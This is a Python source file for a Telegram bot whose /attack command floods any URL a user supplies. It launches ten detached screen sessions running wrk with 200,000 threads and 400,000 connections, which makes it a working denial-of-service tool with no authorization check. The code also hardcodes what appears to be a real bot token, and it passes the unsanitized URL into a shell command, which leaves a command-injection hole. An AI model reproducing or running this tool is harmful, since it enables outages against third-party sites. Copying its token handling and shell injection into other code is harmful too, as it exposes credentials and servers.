import os
import random
import string
import subprocess
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# 机器人Token
BOT_TOKEN = "8186635677:AAHzO7cLQbegebCvXgQKi3sYj53xLysVm-I"

# 随机生成screen名称
def generate_screen_name():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

# 执行攻击命令
def execute_attack(url: str):
    screen_name = generate_screen_name()
    command = f"screen -dmS {screen_name} bash -c 'ulimit -n 1000000 && wrk -t200000 -c400000 -d120s {url}'"
    results = []
    try:
        for i in range(10):
            subprocess.run(command, shell=True, check=True)
            results.append(f"Task {i+1}: Executed")
    except subprocess.CalledProcessError as e:
        results.append(f"Error: {e}")
    return "\n".join(results)

# 处理 /attack 命令
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 1:
        await update.message.reply_text("Usage: /attack <url>")
        return

    url = context.args[0]
    await update.message.reply_text(f"Starting attack on {url}...")

    # 执行攻击
    results = execute_attack(url)

    # 返回结果
    await update.message.reply_text(f"Attack results:\n{results}")

# 主函数
async def main():
    # 创建机器人应用程序
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    # 注册命令处理器
    application.add_handler(CommandHandler("attack", attack_command))

    # 启动机器人
    await application.run_polling()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
